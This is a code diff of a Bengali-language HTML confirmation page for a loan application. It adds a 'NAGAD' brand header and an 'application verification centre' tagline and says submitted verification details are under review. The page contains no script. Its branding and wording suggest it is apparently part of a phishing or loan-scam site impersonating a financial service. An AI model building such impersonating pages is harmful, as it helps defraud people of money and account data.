@@ -3,25 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>আবেদন সফল</title>
+    <title>আবেদন সফল হয়েছে</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background: #fff7ed; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { width: 100%; max-width: 450px; background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px 20px; text-align: center; box-shadow: 0 0 25px rgba(255, 106, 0, 0.08); }
-        .icon-box { width: 85px; height: 85px; background: #dcfce7; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin-bottom: 24px; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.2); }
-        h2 { font-size: 22px; color: #1e293b; margin-bottom: 12px; font-weight: 700; }
-        p { font-size: 14px; color: #64748b; line-height: 1.6; margin-bottom: 35px; }
-        .btn-home { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff5e00, #ff8800); color: #ffffff; text-decoration: none; border-radius: 30px; font-weight: bold; font-size: 15px; box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); display: inline-block; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+        }
+
+        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
+        body { 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            position: relative; 
+            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08); 
+            border-left: 1px solid #fff7ed;
+            border-right: 1px solid #fff7ed;
+        }
+
+        /* কমলা গ্রেডিয়েন্ট অফিসিয়াল হেডার */
+        .header { 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            padding: 30px 20px 26px; 
+            text-align: center; 
+            border-bottom-left-radius: 24px; 
+            border-bottom-right-radius: 24px; 
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2); 
+        }
+        .header-logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        .header-logo {
+            width: 65px;
+            height: 65px;
+            object-fit: cover;
+            border-radius: 50%;
+            background: #ffffff;
+            padding: 3px;
+            border: 2px solid #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .brand-title {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .header p { 
+            font-size: 13px; 
+            opacity: 0.95; 
+        }
+
+        /* মূল কনটেন্ট এরিয়া */
+        .content-wrap { 
+            padding: 35px 24px; 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            text-align: center; 
+            justify-content: center;
+        }
+
+        .success-badge { 
+            width: 80px; 
+            height: 80px; 
+            background: #dcfce7; 
+            color: #16a34a; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 38px; 
+            margin-bottom: 20px; 
+            box-shadow: 0 6px 20px rgba(22, 163, 74, 0.2); 
+        }
+
+        .success-title { 
+            font-size: 22px; 
+            color: #1e293b; 
+            margin-bottom: 10px; 
+            font-weight: 800; 
+        }
+
+        .success-desc { 
+            font-size: 14px; 
+            color: #64748b; 
+            line-height: 1.6; 
+            margin-bottom: 25px; 
+        }
+
+        /* স্ট্যাটাস ইনফো বক্স */
+        .info-card {
+            width: 100%;
+            background: #fffaf5;
+            border: 1.5px solid #fed7aa;
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-align: left;
+        }
+        .info-icon {
+            font-size: 22px;
+            color: #ff5e00;
+        }
+        .info-text {
+            font-size: 13px;
+            color: #334155;
+            font-weight: 600;
+        }
+
+        /* অ্যাকশন বাটন */
+        .btn-home { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            text-decoration: none; 
+            border-radius: 30px; 
+            font-weight: bold; 
+            font-size: 15.5px; 
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px;
+            transition: transform 0.2s;
+        }
+        .btn-home:active { 
+            transform: scale(0.98); 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="icon-box"><i class="fa-solid fa-check"></i></div>
-    <h2>আবেদন সফল হয়েছে!</h2>
-    <p>আপনার আবেদন ও যাচাইকরণ তথ্য সফলভাবে জমা নেওয়া হয়েছে। আমাদের প্রতিনিধি দ্রুতই আপনার সাথে যোগাযোগ করবেন।</p>
-    <a href="loan.html" class="btn-home">হোমপেজে ফিরে যান</a>
+    <div class="header">
+        <div class="header-logo-wrap">
+            <!-- আপনার অফিসিয়াল লোগো -->
+            <img src="logoo.png" alt="Official Logo" class="header-logo">
+        </div>
+        <div class="brand-title">NAGAD</div>
+        <p>আবেদন যাচাইকরণ কেন্দ্র</p>
+    </div>
+
+    <div class="content-wrap">
+        <div class="success-badge">
+            <i class="fa-solid fa-check"></i>
+        </div>
+
+        <h2 class="success-title">আবেদন সফল হয়েছে!</h2>
+        
+        <p class="success-desc">
+            আপনার ঋণ আবেদন এবং যাচাইকরণ তথ্য সফলভাবে গৃহীত হয়েছে। তথ্যগুলো বর্তমানে পর্যালোচনাধীন রয়েছে।
+        </p>
+
+        <div class="info-card">
+            <i class="fa-solid fa-circle-info info-icon"></i>
+            <div class="info-text">
+                আমাদের প্রতিনিধি দ্রুততম সময়ের মধ্যে আপনার দেওয়া নম্বরে যোগাযোগ করে নিশ্চিত করবেন।
+            </div>
+        </div>
+
+        <a href="loan.html" class="btn-home">
+            <i class="fa-solid fa-house"></i>
+            <span>হোমপেজে ফিরে যান</span>
+        </a>
+    </div>
 </div>
 
 </body>
